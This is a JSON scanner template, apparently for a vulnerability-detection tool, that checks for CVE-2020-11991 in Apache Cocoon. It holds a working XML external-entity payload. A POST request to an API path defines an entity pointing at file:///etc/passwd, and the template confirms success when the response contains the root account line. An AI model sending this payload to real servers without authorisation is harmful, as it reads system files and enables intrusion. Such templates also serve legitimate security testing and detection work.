{
    "Name": "Apache Cocoon XML注入 CVE-2020-11991",
    "Description": " Apache Cocoon XML注入 CVE-2020-11991",
    "Product": "apache",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"text/xml"},
        "Uri":"/v2/api/product/manger/getInfo",
        "Port":"",
        "Data":"<!--?xml version=\"1.0\" ?--><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]><userInfo><firstName>John</firstName> <lastName>&ent;</lastName></userInfo>",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:x:0:0:root"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}